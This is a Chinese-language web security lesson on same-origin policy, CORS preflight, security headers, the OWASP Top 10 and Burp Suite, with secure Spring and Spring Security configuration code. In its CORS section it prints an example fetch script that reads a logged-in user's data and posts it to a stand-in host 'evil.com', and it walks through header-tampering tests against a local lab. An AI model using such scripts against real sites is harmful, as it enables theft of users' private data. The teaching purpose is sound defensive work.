## 为什么要学

从这一课开始进入 Web 安全阶段。XSS、CSRF、CORS 配置错误、点击劫持，这些漏洞看起来各不相同，其实都围绕同一个问题：**浏览器同时替很多网站干活，它怎么阻止 A 网站的脚本去读、去操作你在 B 网站上的数据？** 答案就是同源策略，以及在它基础上放宽（CORS）或收紧（安全响应头）的一系列机制。不理解这个模型，后面 [[web-xss]]、[[web-csrf]] 都只能死记 payload。

作为 Java 后端，你一定遇到过前后端分离时浏览器控制台报 “has been blocked by CORS policy”，然后在网上找一段 `allowedOrigins("*")` 或者“把请求的 Origin 原样返回”的代码贴上去就好了。这一课会告诉你为什么这类“万能解法”可能就是一个漏洞，以及正确的写法。你也会第一次系统地看到 OWASP Top 10 这张地图，知道后面每一课处在地图的哪一格。

工具上，这一课要把 Burp Suite 装好。它是 Web 安全从业者最常用的抓包改包工具，后面所有 Lab（`/vuln/lXX` 与 `/secure/lXX`）都可以用它来观察和重放请求，比 curl 直观得多。

学完后你能做到：判断两个 URL 是否同源；读懂一次 CORS 预检的请求与响应并识别危险配置；说出 CSP、HSTS 等安全头各自防什么，并在 Spring 中正确配置；用 Burp 的 Proxy 截获浏览器流量，用 Repeater 改包重放。

## 核心概念

### 同源策略：什么是“源”，它限制了什么、没限制什么

**源（origin）= 协议 + 主机 + 端口**，三者完全相同才是同源。以 `https://shop.example.com/cart` 为基准：

| URL | 是否同源 | 原因 |
|---|---|---|
| `https://shop.example.com/order/1` | 同源 | 只有路径不同 |
| `http://shop.example.com/cart` | 不同源 | 协议不同 |
| `https://api.example.com/cart` | 不同源 | 主机不同（子域名也算不同） |
| `https://shop.example.com:8443/cart` | 不同源 | 端口不同（https 默认 443） |
| `http://localhost:5173` vs `http://localhost:8080` | 不同源 | 端口不同，这就是本地前后端分离开发时 CORS 报错的原因 |

注意“源”和 Cookie 的“站点（site）”是两个概念：`api.example.com` 和 `shop.example.com` 不同源，但属于同一个站点（同一个可注册域名 `example.com`），这在 [[web-csrf]] 中讨论 SameSite 时很重要。

**同源策略限制了什么：** 一个源上的脚本**读取**另一个源的数据。具体包括：

- `fetch`/`XMLHttpRequest` 跨源请求的**响应内容**不能被脚本读取（除非对方用 CORS 授权）。
- 不能访问跨源 iframe 的 DOM，不能读另一个源的 `localStorage`、IndexedDB。
- 不能读 canvas 里绘制的跨源图片像素（画布会被“污染”）。

**没限制什么（很多漏洞就藏在这里）：**

- **跨源发送请求本身不被阻止。** `<form>` 提交、`<img src>`、简单的 `fetch` 都会真的发到对方服务器，浏览器还会按 Cookie 规则自动带上 Cookie。同源策略只是不让脚本读响应。这就是 CSRF 存在的根本原因——攻击只需“写”，不需要“读”。
- **跨源嵌入资源是允许的：** `<script src>`、`<link rel=stylesheet>`、`<img>`、`<iframe>`、`<video>`。JSONP 就是利用 `<script>` 可跨源加载实现的，也因此带来数据泄露风险。
- 被别人用 `<iframe>` 嵌入你的页面，默认也是允许的——这是点击劫持的前提，要靠 `frame-ancestors` 等响应头来禁止。

一句话：**同源策略防的是“跨源读”，不防“跨源写”和“跨源嵌入”。** 另外它是浏览器的规则，curl、Postman、Burp、服务端代码（比如你的 RestTemplate）完全不受它约束——所以它不能替代服务端的认证与鉴权。

### CORS：预检请求，Access-Control-Allow-Origin 反射 Origin + Credentials 的危害

CORS（跨源资源共享）是服务端**主动放宽**同源策略的机制：服务器通过响应头告诉浏览器“允许哪个源的脚本读我的响应”。**决定权在服务器的响应头，执行者是浏览器。**

**简单请求：** 方法是 GET/HEAD/POST，且只带少数“安全”请求头，`Content-Type` 只能是 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` 之一。浏览器直接发送，并自动加上 `Origin` 头：

```
GET /api/orders HTTP/1.1
Host: api.shop.com
Origin: https://www.shop.com
Cookie: SESSION=8f2c...
```

```
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://www.shop.com
Access-Control-Allow-Credentials: true
Vary: Origin

[{"id":1,"amount":99.00}]
```

浏览器检查 `Access-Control-Allow-Origin` 是否等于当前页面的源（带了 Cookie 时还要求 `Allow-Credentials: true`），通过才把响应交给 JS。注意：**请求已经到达服务器并执行了**，CORS 失败只是 JS 读不到结果。

**预检请求（preflight）：** 如果请求用了 PUT/DELETE/PATCH，或 `Content-Type: application/json`，或自定义头（如 `Authorization`、本项目的 `X-User-Id`），浏览器会先发一个 OPTIONS 请求询问：

```
OPTIONS /api/orders/1 HTTP/1.1
Host: api.shop.com
Origin: https://www.shop.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization,content-type
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.shop.com
Access-Control-Allow-Methods: GET,POST,DELETE
Access-Control-Allow-Headers: authorization,content-type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
```

预检通过后浏览器才发真正的 DELETE。`Max-Age` 让浏览器缓存预检结果（浏览器各自有上限）。预检请求不带 Cookie，所以服务端的认证过滤器要放行 OPTIONS 预检，否则预检会 401 失败——Spring Security 集成 CORS 后会自动处理这一点。

```
browser (www.shop.com)             api.shop.com
----------------------             ------------
OPTIONS + Origin        ---------->  check origin whitelist        预检：问能不能发
                        <----------  Allow-Origin / Methods / Headers
DELETE + Origin + Cookie ---------->  run business logic            真正请求
                        <----------  200 + Allow-Origin             浏览器校验后交给 JS
```

`Vary: Origin` 的作用：响应内容随 Origin 不同而不同，告诉 CDN/Nginx 缓存按 Origin 区分，否则可能把给 A 源的响应头缓存后发给 B 源。

**危险配置：反射 Origin + Credentials。** 很多人为了“解决跨域”写出这样的代码：

```java
// 错误示范：任何源都被信任
response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
response.setHeader("Access-Control-Allow-Credentials", "true");
```

效果等于“任何网站的 JS 都可以带着用户的 Cookie 调用我的接口并读取结果”。攻击过程：用户已登录 `shop.com`，被诱导打开 `evil.com`，页面里的脚本执行：

```
fetch('https://api.shop.com/api/me', { credentials: 'include' })
  .then(r => r.text())
  .then(t => fetch('https://evil.com/collect', { method: 'POST', body: t }));
```

浏览器带着 shop.com 的 Cookie 发出请求，服务器反射回 `Access-Control-Allow-Origin: https://evil.com` 和 `Allow-Credentials: true`，浏览器认为授权合法，把用户的个人信息、订单、甚至 CSRF token 交给了攻击者的脚本。其他常见错误变体：

- 用 `origin.endsWith("shop.com")` 校验，`evilshop.com` 也能通过；用 `contains`、没转义点号的正则同理。
- 信任 `Origin: null`（来自沙箱 iframe、`file://`、某些重定向），攻击者可以用 `<iframe sandbox>` 主动构造 null 源。
- 信任所有子域名，但某个子域名存在 XSS 或被子域名接管，攻击者就能从那里发起请求。

**本课问题：CORS 配置成 `*` 为什么浏览器不允许同时携带 Cookie？** 规范规定：对带凭据（Cookie、HTTP 认证、客户端证书）的请求，`Access-Control-Allow-Origin` 不能是 `*`，必须是具体的源，否则浏览器拒绝把响应交给脚本（同理 `Allow-Headers`、`Allow-Methods` 的 `*` 在带凭据时也不被当作通配符）。原因是 `*` 的语义是“这是公开数据，谁都能读”，适合公开的 CDN 资源、公开 API；而带 Cookie 的响应是**某个用户的私有数据**。如果允许两者组合，任何网站都能以受害用户的身份读取其私有数据，同源策略就形同虚设。规范用这条硬限制强迫开发者**显式列出**信任的源。讽刺的是，反射 Origin 的写法正是开发者为了绕过这条限制而发明的，结果亲手重新打开了这个洞。

### 安全响应头：CSP、HSTS、X-Content-Type-Options、X-Frame-Options / frame-ancestors

安全头是服务器让浏览器“收紧”行为的指令，每个头针对一类攻击：

| 响应头 | 示例值 | 防什么 |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'` | XSS 的危害（限制脚本从哪加载、禁止内联脚本）、点击劫持 |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | SSL 剥离、降级到 HTTP 的中间人 |
| `X-Content-Type-Options` | `nosniff` | MIME 嗅探：把用户上传的“图片”当成脚本或 HTML 执行 |
| `X-Frame-Options` | `DENY` 或 `SAMEORIGIN` | 点击劫持（被 iframe 嵌入） |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | URL 中的敏感参数通过 Referer 泄露给第三方 |

**CSP（内容安全策略）：** 用白名单声明页面可以从哪里加载各类资源。`script-src 'self'` 表示只允许加载本源的脚本文件，且默认禁止内联 `<script>` 和 `onclick=` 这类内联事件以及 `eval`。于是即使攻击者注入了 `<script>alert(1)</script>`，浏览器也不执行。它是 XSS 的**第二道防线**，第一道仍是输出编码（见 [[web-xss]] 与本项目 Lab 02）。上线时可以先用 `Content-Security-Policy-Report-Only` 只报告不拦截，观察误伤后再切换为强制。`'unsafe-inline'` 会让 CSP 对 XSS 基本失效，需要内联脚本时用 nonce 或 hash。

**HSTS：** 浏览器第一次通过 HTTPS 收到这个头后，在 `max-age` 秒内对该域名的所有访问都自动改用 HTTPS，用户输入 `http://` 也不会发出明文请求。只在 HTTPS 响应中有效（HTTP 响应里的会被忽略）。`includeSubDomains` 要确认所有子域都支持 HTTPS 再加，否则会让某些子域不可访问。首次访问之前的那一次仍有风险，这就是 preload 列表存在的原因。原理见 [[net-tls]]。

**X-Content-Type-Options: nosniff：** 让浏览器严格按 `Content-Type` 处理响应，不去“猜”内容类型。在文件上传场景（[[web-upload]]）中尤其重要。

**X-Frame-Options 与 frame-ancestors：** 点击劫持是指攻击者用透明 iframe 把你的页面（例如“确认转账”按钮）叠在诱饵页面上，用户以为点的是“领红包”。`X-Frame-Options: DENY` 禁止任何页面嵌入，`SAMEORIGIN` 只允许同源嵌入。CSP 的 `frame-ancestors` 是新的标准做法，能力更强（可以列多个允许的源）；当两者同时存在时，支持 CSP 的浏览器以 `frame-ancestors` 为准。为兼容旧浏览器，通常两个都发。

另外，`X-XSS-Protection` 这个老头部对应的浏览器 XSS 过滤器已被主流浏览器移除，OWASP 建议不再依赖，设为 `0` 或不发送。

### OWASP Top 10 各项含义，信任边界与“所有输入都不可信”

OWASP Top 10 是 OWASP 基于大量应用测试数据整理的“最关键的 Web 应用安全风险”清单，是一份认知地图，而不是完整的检查标准。下表以 **2021 版**为准（OWASP 会定期更新版本，排序和条目可能变化，请以 [OWASP Top 10](https://owasp.org/www-project-top-ten/) 官网的最新版本为准）：

| 编号 | 名称 | 一句话含义 | 对应课程 |
|---|---|---|---|
| A01 | Broken Access Control 失效的访问控制 | 越权：看了/改了不属于自己的数据，含 CORS 配错 | [[web-access]]、Lab 04 |
| A02 | Cryptographic Failures 加密失败 | 明文传输、弱哈希存密码、密钥管理不当 | [[net-tls]]、[[cloud-secrets]] |
| A03 | Injection 注入 | SQL、命令、表达式注入，也包括 XSS | [[web-sqli]]、[[web-xss]]、[[web-rce]] |
| A04 | Insecure Design 不安全的设计 | 设计阶段就缺少安全控制，例如找回密码流程可被绕过 | [[ss-arch]] |
| A05 | Security Misconfiguration 安全配置错误 | 默认口令、暴露 Actuator、缺安全头、错误详情外泄 | 本课、[[linux-systemd]] |
| A06 | Vulnerable and Outdated Components 易受攻击和过时的组件 | 依赖库存在已知漏洞 | [[web-deser]] |
| A07 | Identification and Authentication Failures 身份识别与认证失败 | 弱口令、会话固定、JWT 校验缺失 | [[web-authn]]、[[ss-token]] |
| A08 | Software and Data Integrity Failures 软件和数据完整性失败 | 不安全反序列化、CI/CD 与更新包未校验 | [[web-deser]] |
| A09 | Security Logging and Monitoring Failures 安全日志和监控失败 | 被攻击了却没有日志、没有告警 | [[cloud-detect]] |
| A10 | Server-Side Request Forgery 服务端请求伪造 | 服务端被利用去访问内网或云元数据 | [[web-ssrf]]、Lab 05 |

**信任边界：** 数据从一个信任级别流向另一个信任级别的那条线。画出来就能知道哪里必须校验：

```
[ Browser / App / IoT device ]   untrusted: user controls everything   不可信
            |  HTTP (headers, params, body, cookies)
============|====================== trust boundary ======================
            v
[ Spring Controller ] -> validate, authN, authZ                         边界处校验
            |
[ Service ] -> [ MyBatis / JDBC ] -> [ MySQL ]                          内部也要参数化
            |
[ Outbound HTTP / MQTT ] -> other systems                               出站同样要校验
```

“所有输入都不可信”的具体含义：不仅是表单参数，**请求头（Host、X-Forwarded-For、Origin、Referer、本项目的 X-User-Id）、Cookie、上传文件名、JSON 里的每个字段、前端做过的校验、App/车机/IoT 设备上报的数据、第三方回调、甚至数据库里之前存进去的用户数据**，都可能被攻击者控制。前端校验只是用户体验，服务端必须重新校验。本项目用 `X-User-Id` 头模拟当前用户正是一个反例：用 Burp 改一下这个头就能冒充任何人。

### 搭好 Burp Suite Community，会用 Proxy 与 Repeater

Burp Suite 是一个**拦截代理**：浏览器把流量发给 Burp，Burp 再转发给真实服务器，于是你能看到、暂停、修改每一个请求和响应。

```
browser  --->  Burp Proxy (127.0.0.1:8081)  --->  target (MyNotes 127.0.0.1:8080)   浏览器走代理
                     |
                     +--> HTTP history / Repeater                                   记录与重放
```

Community 版（免费）与 Pro 版的主要差别在自动化扫描器和速度等，对学习来说 Community 已经足够。本课用两个核心模块：

- **Proxy：** `Intercept` 开关打开时，请求会停在 Burp 等你放行（Forward）或丢弃（Drop），可以当场修改；`HTTP history` 记录所有经过的请求，是最常用的视图。
- **Repeater：** 把某个请求发送过来（右键 Send to Repeater，快捷键 Ctrl+R / Cmd+R），随意改参数、改头、改方法，点 Send 看响应。它是手工测试漏洞的主力：改 `X-User-Id` 测越权，改参数测 SQL 注入，改 `Origin` 测 CORS。

:::warn 端口冲突：Burp 默认监听 127.0.0.1:8080
Burp 的代理监听器默认就是 `127.0.0.1:8080`，与本项目 MyNotes 的端口相同。谁先启动谁占用端口，后启动的会失败（Burp 会提示监听端口绑定失败，Spring Boot 会报 `Port 8080 was already in use`）。本课统一把 Burp 的监听器改到 **127.0.0.1:8081**，MyNotes 保持 8080。
:::

## 动手实践

### 练习 1：注册 PortSwigger Web Security Academy 账号

1. 打开 [PortSwigger Web Security Academy](https://portswigger.net/web-security)，右上角注册（邮箱即可，免费）。
2. 登录后进入 Learning path 或 All topics，找到 CORS 专题（[PortSwigger：CORS](https://portswigger.net/web-security/cors)），先读完再做其中难度标为 APPRENTICE 的实验。
3. 每个实验点 “Access the lab” 会给你一个独立的临时靶场域名（形如 `https://<随机串>.web-security-academy.net`），题目要求达成后页面顶部会变成 “Congratulations, you solved the lab!”。

怎么判断做完了：Academy 个人主页的进度里该实验标记为 Solved。建议把每个实验的关键请求在 Burp 里保存下来，写进 `docs/labs/` 的笔记。Academy 的靶场是 PortSwigger 授权你测试的，这与随便扫别人的网站有本质区别。

### 练习 2：安装 Burp Suite Community 并代理浏览器流量

第 1 步：从 [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) 下载对应系统的安装包（macOS 选 Apple Silicon 或 Intel 版本），安装并启动，选择 Temporary project 与 Use Burp defaults。

第 2 步：把监听器改到 8081。进入 **Proxy → Proxy settings**（较旧版本在 Proxy → Options），在 **Proxy listeners** 中选中 `127.0.0.1:8080` 那一行点 Edit，把端口改成 `8081`，保持 Bind to address 为 Loopback only，确定后确认该行的 Running 已勾选。菜单位置不同版本略有差异，以你安装的版本为准。

第 3 步：启动 MyNotes（项目根目录 `./mvnw spring-boot:run`），确认两个端口各归其主：

```
$ lsof -nP -iTCP -sTCP:LISTEN | grep -E ':(8080|8081)'
java     5012 aqin  45u  IPv6 ...  TCP 127.0.0.1:8080 (LISTEN)
java     4870 aqin  88u  IPv6 ...  TCP 127.0.0.1:8081 (LISTEN)
```

两个都是 `java` 进程（Burp 也是 Java 程序），用 PID 或 `ps -p 4870 -o command` 区分。

第 4 步：让浏览器走代理。**推荐用 Burp 自带浏览器**：Proxy → Intercept → Open browser，它已自动配置好走 Burp 的代理并信任 Burp 的 CA 证书，不用改系统设置。如果用 Firefox：设置 → 网络设置 → 手动代理，HTTP 代理 `127.0.0.1` 端口 `8081`，勾选“也将此代理用于 HTTPS”；Firefox 默认不代理 localhost/127.0.0.1，需要在 `about:config` 里把 `network.proxy.allow_hijacking_localhost` 设为 `true`。访问 HTTPS 站点（如 Academy）时，还要在走代理的状态下打开 `http://burpsuite` 下载 CA 证书，并导入 Firefox 的证书管理器（只为 Burp 这个 CA 勾选“信任它来标识网站”）。

第 5 步：用 Proxy 抓包。在代理浏览器里打开 `http://127.0.0.1:8080/vuln/l04/notes/1`，这个接口要求 `X-User-Id` 头，浏览器地址栏无法添加，所以会得到 400。到 **Proxy → HTTP history** 找到这条请求，下方能看到原始报文：

```
GET /vuln/l04/notes/1 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,...
Connection: keep-alive
```

响应为 `HTTP/1.1 400`。如果 HTTP history 里什么都没有，说明浏览器没走代理（最常见的是 Firefox 的 localhost 例外没关）。

第 6 步：用 Repeater 改包。右键这条请求 → Send to Repeater，在 Repeater 里加一行请求头并把 id 改成 3：

```
GET /vuln/l04/notes/3 HTTP/1.1
Host: 127.0.0.1:8080
X-User-Id: 1
```

点 Send，右侧响应：

```
HTTP/1.1 200
Content-Type: application/json

{"id":3,"ownerId":2,"title":"bob diary","content":"bob private diary"}
```

怎么读：你以 alice（id=1）的身份读到了 bob（ownerId=2）的日记——这就是 Lab 04 的水平越权，也说明“客户端传来的 X-User-Id 不可信”。（笔记 id 由数据库自增生成，若内容对不上，换几个 id 试试。）再把路径改为 `/vuln/l04/admin/users` 发送，会看到包含 `PASSWORD` 列的用户列表：这是垂直越权加过度返回。修复是 Lab 04 留给你的练习。

第 7 步：用 Repeater 观察 CORS。发送一个带 Origin 的请求：

```
GET /vuln/l04/notes/1 HTTP/1.1
Host: 127.0.0.1:8080
X-User-Id: 1
Origin: https://evil.example
```

响应里**没有** `Access-Control-Allow-Origin`：MyNotes 没配置 CORS，浏览器会阻止 evil.example 的脚本读取响应。以后你给任何接口配置了 CORS，都用这个方法测一遍：把 Origin 换成恶意域名、`null`、`https://yourdomain.com.evil.example`，看响应头有没有被“反射”。测试完记得关掉 Intercept 或把浏览器代理改回，否则 Burp 关闭后浏览器会上不了网。

## 攻击者视角

> 本课的 payload 与测试方法只能用于你自己的环境（如 MyNotes 靶场）、PortSwigger Academy 或其他已获授权的目标。

攻击者面对一个 Web 应用时，本课内容就是他的第一轮侦察清单：

- **测 CORS：** 在 Repeater 里给每个带登录态的 API 加 `Origin: https://attacker.example`、`Origin: null`、`Origin: https://target.com.attacker.example`、`Origin: https://attackertarget.com`，只要响应中出现反射的 `Access-Control-Allow-Origin` 且伴随 `Access-Control-Allow-Credentials: true`，就可以写一个页面诱导已登录用户访问，窃取其数据（上文的 fetch 脚本）。
- **看安全头：** 缺 CSP 意味着找到一个 XSS 注入点就能直接执行任意脚本；缺 `frame-ancestors`/`X-Frame-Options` 的敏感操作页可以做点击劫持；上传接口缺 `nosniff` 并且对外提供下载时，可能让上传的内容被当作 HTML 渲染；缺 HSTS 的站点在公共 Wi-Fi 下可能被降级为 HTTP 截获。
- **找信任边界漏洞：** 任何“服务端相信客户端说法”的地方——身份头（`X-User-Id`）、价格字段、`X-Forwarded-For` 用于限流或 IP 白名单、前端隐藏的按钮对应的接口——都会被 Repeater 一个个改过去。
- **明白同源策略的空白：** 攻击者知道浏览器会替他发跨源请求并带上 Cookie，只要服务端没有 CSRF 防护，他根本不需要读响应（[[web-csrf]]）。

## 防御与最佳实践

### Spring 中正确配置 CORS

原则：**白名单写死具体的源**，不反射、不用 `*` 配合凭据；只开放需要的方法和头；能不用 Cookie 跨域就不用。没有引入 Spring Security 时（MyNotes 当前就是这种情况），在 MVC 层全局配置：

```java
package com.aqin.mynotes.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class CorsConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
                .allowedOrigins("https://www.shop.com", "https://admin.shop.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("Authorization", "Content-Type")
                .allowCredentials(true)
                .maxAge(1800);
    }
}
```

Spring 会自动处理预检、只对白名单内的 Origin 返回 `Access-Control-Allow-Origin`（值为具体的源）并添加 `Vary` 头；不在白名单内的预检会被拒绝（403）。如果把 `allowedOrigins("*")` 和 `allowCredentials(true)` 组合，Spring 在处理请求时会直接抛出异常拒绝这种配置，这是框架在帮你挡坑。`allowedOriginPatterns("https://*.shop.com")` 支持通配子域名且可与凭据共用，但请想清楚所有子域名是否都可信。单个接口也可以用 `@CrossOrigin(origins = "https://www.shop.com")`，但全局配置更容易审计。

### Spring Security 中配置 CORS 与安全头

引入 `spring-boot-starter-security` 后（本项目计划在 Lab 10 引入），CORS 必须在安全过滤器链里启用，因为预检请求要在认证之前被处理；安全头也由它统一写出。以下为 Spring Security 6+ 的 lambda DSL 写法：

```java
package com.aqin.mynotes.config;

import java.util.List;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.ReferrerPolicyHeaderWriter.ReferrerPolicy;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.CorsConfigurationSource;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;

@Configuration
public class SecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/app.js", "/app.css", "/lessons/**").permitAll()
                .anyRequest().authenticated())
            .httpBasic(Customizer.withDefaults())
            .cors(Customizer.withDefaults())          // 使用下面的 CorsConfigurationSource bean
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives(
                    "default-src 'self'; script-src 'self'; object-src 'none'; "
                    + "base-uri 'self'; frame-ancestors 'none'"))
                .frameOptions(frame -> frame.deny())
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000))
                .referrerPolicy(ref -> ref.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)));
        return http.build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://www.shop.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setAllowCredentials(true);
        config.setMaxAge(1800L);
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

要点：Spring Security 默认就会写出 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`、`Cache-Control: no-cache, no-store...`、`X-XSS-Protection: 0`，以及仅在 HTTPS 请求上写出的 HSTS；**CSP 默认不写**，必须像上面这样根据自己的页面显式配置（MyNotes 的学习站点若有内联脚本或外部 CDN，需要相应调整或先用 report-only 观察）。上面的 `permitAll` 路径只是示意，按实际静态资源调整。

不引入 Spring Security 时，可以写一个 `OncePerRequestFilter` 在 `response.setHeader(...)` 中写这些头，或者在前置的 Nginx 里用 `add_header ... always;` 统一添加（注意 Nginx 的 `add_header` 在子 location 中定义后会覆盖而不是继承上层的设置）。验证方法：

```
$ curl -sI http://127.0.0.1:8080/ | grep -iE 'content-security|x-frame|x-content-type|strict-transport|referrer'
```

没有输出说明一个安全头都没有——这也是你第一次对 MyNotes 做的“安全配置错误”（A05）检查。

### 其他实践

- 在网关/Nginx 与应用中**只在一处**配置 CORS，两处都加会出现重复的 `Access-Control-Allow-Origin`，浏览器会直接判定失败，也让审计变困难。
- 在集成测试里断言安全头与 CORS 行为：用 MockMvc 带上恶意 `Origin` 发请求，断言响应中没有 `Access-Control-Allow-Origin`，与本项目 Lab 测试“vuln 被打穿、secure 挡住”的思路一致。
- 服务端对每个输入做校验（Bean Validation），身份一律来自服务端会话或已验签的令牌，不来自客户端自报的头或参数。

## 常见误区

| 误区 | 实际情况 |
|---|---|
| “CORS 是一种安全防护，配了就更安全” | CORS 是**放宽**同源策略的机制，配得越宽越危险；不配置才是最严格的 |
| “CORS 报错说明请求没到服务器” | 简单请求已经到达并执行，只是 JS 读不到响应；有副作用的操作仍会发生 |
| “CORS 能防 CSRF” | 表单提交等跨源写操作不受 CORS 约束，CSRF 需要 token 或 SameSite |
| “反射 Origin 就能兼容所有前端” | 等于信任所有网站，配合凭据就是数据泄露漏洞 |
| “同源策略能保护我的 API 不被调用” | 它只约束浏览器里的脚本；curl、Burp、脚本随便调，必须靠认证鉴权 |
| “加了 CSP 就不用做输出编码” | CSP 是第二道防线，配置常有疏漏（如 `'unsafe-inline'`），编码仍是必须 |
| “HTTP 站点也能靠 HSTS 头升级” | 通过 HTTP 收到的 HSTS 头会被浏览器忽略 |

## 自测

:::details 1. `http://localhost:5173` 的前端调用 `http://localhost:8080/api`，为什么会触发 CORS？
源由协议、主机、端口三者组成，两者端口不同，所以不同源。开发时可以用前端开发服务器的代理转发（让浏览器看来同源），或在后端白名单里加入这个开发源（只在开发环境）。
:::

:::details 2. 同源策略限制了什么、没限制什么？
限制脚本跨源读取响应、DOM 和存储；不限制跨源发送请求（表单、img、简单 fetch，且可能自动带 Cookie），也不限制跨源嵌入脚本、样式、图片、iframe。
:::

:::details 3. 什么情况下浏览器会发预检请求？预检里有哪些关键头？
非简单请求：方法不是 GET/HEAD/POST，或带自定义头（Authorization、X-User-Id），或 Content-Type 为 application/json 等。请求中是 Origin、Access-Control-Request-Method、Access-Control-Request-Headers；响应中是 Access-Control-Allow-Origin/Methods/Headers/Credentials 和 Max-Age。
:::

:::details 4. CORS 配置成 * 为什么浏览器不允许同时携带 Cookie？
`*` 表示公开资源谁都能读，而带 Cookie 的响应是特定用户的私有数据。若允许组合，任何网站都能以受害者身份读取其数据，同源策略失效。所以规范要求带凭据时必须返回具体的源，强制开发者显式列出白名单。
:::

:::details 5. 服务端把请求的 Origin 原样写回 Access-Control-Allow-Origin 并设置 Allow-Credentials: true，攻击者如何利用？
在自己的网站放一段 `fetch(url, {credentials:'include'})` 脚本，诱导已登录用户访问；浏览器带上 Cookie 请求，服务器反射攻击者源，浏览器放行，脚本读到用户私有数据后再发回攻击者服务器。
:::

:::details 6. CSP、HSTS、X-Content-Type-Options、frame-ancestors 分别主要防什么？
CSP：限制脚本来源，降低 XSS 危害；HSTS：强制 HTTPS，防降级和 SSL 剥离；nosniff：防 MIME 嗅探导致的内容被错误执行；frame-ancestors（及 X-Frame-Options）：防点击劫持。
:::

:::details 7. 为什么本课要把 Burp 的监听端口改到 8081？如何确认浏览器流量真的经过了 Burp？
Burp 默认监听 127.0.0.1:8080，与 MyNotes 冲突。访问任意页面后查看 Proxy → HTTP history 是否出现该请求；用 Firefox 访问 127.0.0.1 时还需开启 `network.proxy.allow_hijacking_localhost`。
:::

:::details 8. OWASP Top 10 中哪一项与本项目的 X-User-Id 设计最相关？为什么？
A01 失效的访问控制（以及 A07 认证失败）：身份来自客户端自报的请求头，用 Burp 改一下就能冒充别人、越权访问他人数据。
:::

## 一句话总结

同源策略只挡“跨源读”，CORS 是服务端有意开的口子，必须用具体源的白名单来开；安全头让浏览器帮你多挡一层；而服务端要把越过信任边界的每一个输入都当作攻击者可控——Burp 就是你验证这一切的放大镜。
